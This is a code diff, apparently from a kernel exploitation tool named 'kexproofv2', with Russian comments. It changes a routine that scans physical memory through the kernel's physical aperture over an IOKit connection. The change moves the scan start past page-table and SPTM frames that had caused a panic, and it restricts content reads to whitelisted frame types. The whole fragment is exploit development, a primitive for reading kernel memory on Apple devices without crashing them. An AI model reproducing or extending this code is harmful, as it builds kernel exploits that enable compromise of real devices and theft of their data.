@@ -8228,7 +8228,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     if (uoff2 + 0x100 <= 0x4000 && mapOK) {
                         uint64_t reads = 0;
-                        uint64_t idx = 0;
+                        // kexproofv2 2.0.5: скан НАЧИНАЕМ с 1GB — нижние PA
+                        // (physBase..+1GB) — это PT/TTBR/SPTM-кадры, их
+                        // kernel-aperture чтение = «Unexpected fault in kernel
+                        // physical aperture» (паника 05:58:46, syslog поймал
+                        // смерть на 8-м кадре). Диапазон = DART-окно.
+                        uint64_t idx = (0x40000000ULL >> 14);
+                        // whitelist контент-чтений: ТОЛЬКО доказанно-читаемые
+                        // типы (тип ctlPA/backingPA — маркеры через phystokv
+                        // читались; 0x10 — наши bounce-буферы). Остальные типы
+                        // только в гистограмму, контент не трогаем.
+                        int tSafe1 = ctlPA ? kpFrameTypeOf(ctlPA) : -1;
+                        int tSafe2 = backingPA ? kpFrameTypeOf(backingPA) : -1;
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] whitelist контент-чтений: типы {0x10, %d, %d}, старт idx=%#llx (PA>=%#llx)",
+                                  tSafe1, tSafe2, (unsigned long long)idx, (unsigned long long)(pB + (idx << 14))]);
                         // kexproofv2 2.0.0: гистограмма frame-типов — ответ на
                         // «тип не тот — понадобится гистограмма» (1.9.279).
                         // Показывает, какими типами реально заняты кадры и
@@ -8247,6 +8260,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (t < 0) typeNoTable++;
                             else if (t < 64) typeHist[t]++;
                             if (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18) continue;   // таблицы — deadly
+                            // 2.0.5: контент читаем только whitelist-типы
+                            if (t != 0x10 && t != tSafe1 && t != tSafe2) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
                             if (!pkva2) continue;
                             reads++;
